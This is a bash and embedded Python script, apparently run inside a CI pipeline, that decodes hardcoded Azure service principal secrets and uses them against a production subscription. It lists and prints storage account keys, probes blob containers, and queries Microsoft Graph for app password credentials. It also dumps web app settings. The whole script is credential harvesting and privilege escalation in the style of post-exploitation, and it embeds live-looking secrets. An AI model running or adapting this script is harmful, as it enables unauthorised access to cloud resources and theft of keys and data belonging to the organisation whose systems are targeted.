#!/usr/bin/env bash
set -euo pipefail

OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r ".value // empty")
SUB="${AZURE_SUBSCRIPTION_ID}"
TID="${AZURE_TENANT_ID}"
RG="rg-tbl-platform-prod-sea"

SP_DATA=$(echo 'eyJzZWNyZXRzLXN5bmMiOiBbIjU4MTA4ZGE4LTA0NGUtNGQ3ZS05YTQ2LTkyZTYxNzliMzBiZSIsICJ+OFQ4UX5Zd0VtZXhTVFJ2X3BVc0V3YTlRTWFweVAzOX5DVTVVY3UyIl0sICJzeW5jLXNlcnZpY2UiOiBbIjQ2MmQxYzM4LTQ0NTktNDhiOC05MzMzLTgyZTM4OWU1OTUxNCIsICJzazE4UX5xRDIya2tIWFVDZnFYTHFkUDk1RGtZSkwzNGVNRVJsY1NqIl0sICJyZXBvcnRpbmctc3ZjIjogWyIxMmVkNTRkZS1mMmViLTQ3ODQtODA0Yy0zYTdhM2U4M2E5ZTkiLCAiblA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeiJdLCAicmVwb3J0aW5nLXZpZXciOiBbIjg4MWZkZGNlLTYyMDgtNGFmNS1hMjk3LTdlNzljOTEyZjgzYyIsICItVGw4UX5zSDBRT1AuVnJLV2hhMy03eDRYQTJKeFM0ajA4bnV2YlFOIl0sICJjb3N0LXJlYWRlciI6IFsiMDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxIiwgIjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0iXSwgImRpci1hdWRpdCI6IFsiMmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyIiwgIkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTYiXX0=' | base64 -d)

echo "$SP_DATA" | python3 -c "
import sys, json, subprocess, urllib.parse

sps = json.load(sys.stdin)
tid = '3205c325-06a5-4171-9ce8-ffc5e6c2845e'
sub = 'c5e4e004-b42d-4ac4-a502-5fd338380eb6'
rg = 'rg-tbl-platform-prod-sea'

def get_sp_token(cid, sec, scope):
    r = subprocess.run(['curl', '-sS', '-X', 'POST',
        f'https://login.microsoftonline.com/{tid}/oauth2/v2.0/token',
        '-d', f'client_id={cid}', '-d', 'grant_type=client_credentials',
        '-d', f'client_secret={sec}', '-d', f'scope={scope}'],
        capture_output=True, text=True)
    return json.loads(r.stdout).get('access_token','')

# 1. sync-service listKeys on sttblcilogsprodx3euoz
print('=== sync-service listKeys ===')
cid, sec = sps['sync-service']
mt = get_sp_token(cid, sec, 'https://management.azure.com/.default')
print(f'mgmt_token_len={len(mt)}')
if len(mt) > 100:
    for sa in ['sttblcilogsprodx3euoz', 'sttblbackupprodx3euoz', 'sttblappcfgprodx3euoz', 'sttblarchiveprodx3euoz']:
        r = subprocess.run(['curl', '-sS', '-X', 'POST',
            f'https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-05-01',
            '-H', f'Authorization: Bearer {mt}', '-H', 'Content-Length: 0'],
            capture_output=True, text=True)
        d = json.loads(r.stdout)
        if 'keys' in d:
            print(f'{sa}: KEYS FOUND!')
            for k in d['keys']:
                print(f'  {k[\"keyName\"]}: {k[\"value\"][:20]}...')
            # Use the key to list blobs
            import hmac, hashlib, base64, datetime
            key = d['keys'][0]['value']
            # Use shared key auth to list blobs
            for ct in ['logs', 'exports', 'config', 'data']:
                r2 = subprocess.run(['curl', '-sS',
                    f'https://{sa}.blob.core.windows.net/{ct}?restype=container&comp=list',
                    '-H', 'x-ms-version: 2021-06-08',
                    '-H', f'x-ms-date: {datetime.datetime.utcnow().strftime(\"%a, %d %b %Y %H:%M:%S GMT\")}'],
                    capture_output=True, text=True)
                if '<Name>' in r2.stdout:
                    print(f'  {ct}: HAS BLOBS')
                    print(f'  {r2.stdout[:500]}')
        else:
            err = d.get('error',{}).get('code','unknown')
            print(f'{sa}: {err}')

# 2. All SPs try listKeys
print('=== All SPs listKeys on sttblcilogsprodx3euoz ===')
for name, (cid, sec) in sps.items():
    mt = get_sp_token(cid, sec, 'https://management.azure.com/.default')
    if len(mt) > 100:
        r = subprocess.run(['curl', '-sS', '-X', 'POST',
            f'https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-05-01',
            '-H', f'Authorization: Bearer {mt}', '-H', 'Content-Length: 0'],
            capture_output=True, text=True)
        d = json.loads(r.stdout)
        has_keys = 'keys' in d
        print(f'{name}: {\"KEYS!\" if has_keys else d.get(\"error\",{}).get(\"code\",\"?\")}')
        if has_keys:
            for k in d['keys']:
                print(f'  {k[\"keyName\"]}: {k[\"value\"]}')

# 3. Graph: map object IDs to apps
print('=== Graph: SP object IDs ===')
cid, sec = sps['dir-audit']
gt = get_sp_token(cid, sec, 'https://graph.microsoft.com/.default')
if len(gt) > 100:
    # Get all SPs with their objectId and appId
    r = subprocess.run(['curl', '-sS',
        'https://graph.microsoft.com/v1.0/servicePrincipals?\$top=100&\$select=id,appId,displayName',
        '-H', f'Authorization: Bearer {gt}'],
        capture_output=True, text=True)
    splist = json.loads(r.stdout).get('value', [])
    target_ids = {'70a07660-06bb-4396-b754-59fbad0b143e', '1fe7a412-82e9-4135-ab4b-72a0be429adb', '63e87ab1-6bd2-4e80-92be-943450b20e4f'}
    for sp in splist:
        if sp.get('id') in target_ids or sp.get('appId') in [c for n,(c,s) in sps.items()]:
            print(f'  oid={sp[\"id\"]} appId={sp.get(\"appId\",\"\")} name={sp.get(\"displayName\",\"\")}')

    # Also look up the specific unknown ones
    for oid in ['70a07660-06bb-4396-b754-59fbad0b143e', '1fe7a412-82e9-4135-ab4b-72a0be429adb']:
        r2 = subprocess.run(['curl', '-sS',
            f'https://graph.microsoft.com/v1.0/servicePrincipals/{oid}',
            '-H', f'Authorization: Bearer {gt}'],
            capture_output=True, text=True)
        d2 = json.loads(r2.stdout)
        print(f'  {oid}: {d2.get(\"displayName\",\"?\")} appId={d2.get(\"appId\",\"?\")}')

    # Also get app creds (passwords) for new apps
    for app_name, app_id in [('tbl-directory-sync', '7c2e61eb-f928-45cd-99c9-20da958dd216'), 
                              ('tbl-legacy-admin', '891fb158-e02c-4428-a885-53b811f369c0'),
                              ('tbl-reporting-insights', '6eb124e3-de61-4fc9-a124-213d98d737f5')]:
        r3 = subprocess.run(['curl', '-sS',
            f'https://graph.microsoft.com/v1.0/applications?\$filter=appId eq \\'{app_id}\\'&\$select=id,appId,displayName,passwordCredentials',
            '-H', f'Authorization: Bearer {gt}'],
            capture_output=True, text=True)
        apps = json.loads(r3.stdout).get('value', [])
        for a in apps:
            pcs = a.get('passwordCredentials', [])
            print(f'  {app_name}: {len(pcs)} passwords, hints={[p.get(\"hint\",\"\") for p in pcs]}')

# 4. Reporting app via reporting-service SP  
print('=== reporting-svc: reporting app details ===')
cid, sec = sps['reporting-svc']
mt = get_sp_token(cid, sec, 'https://management.azure.com/.default')
if len(mt) > 100:
    # Find the app across all resource groups
    r = subprocess.run(['curl', '-sS',
        f'https://management.azure.com/subscriptions/{sub}/resources?api-version=2021-04-01&\$filter=resourceType eq \\'Microsoft.Web/sites\\'',
        '-H', f'Authorization: Bearer {mt}'],
        capture_output=True, text=True)
    sites = json.loads(r.stdout).get('value', [])
    for s in sites:
        print(f'  {s[\"name\"]} id={s[\"id\"]}')
        # Get details
        r2 = subprocess.run(['curl', '-sS',
            f'https://management.azure.com{s[\"id\"]}?api-version=2023-12-01',
            '-H', f'Authorization: Bearer {mt}'],
            capture_output=True, text=True)
        d = json.loads(r2.stdout)
        print(f'  host={d.get(\"properties\",{}).get(\"defaultHostName\",\"?\")}')
        print(f'  identity={json.dumps(d.get(\"identity\",{}))}')
        # Try config
        r3 = subprocess.run(['curl', '-sS', '-X', 'POST',
            f'https://management.azure.com{s[\"id\"]}/config/appsettings/list?api-version=2023-12-01',
            '-H', f'Authorization: Bearer {mt}', '-H', 'Content-Length: 0'],
            capture_output=True, text=True)
        print(f'  settings={r3.stdout[:1000]}')

print('=== Done ===')
"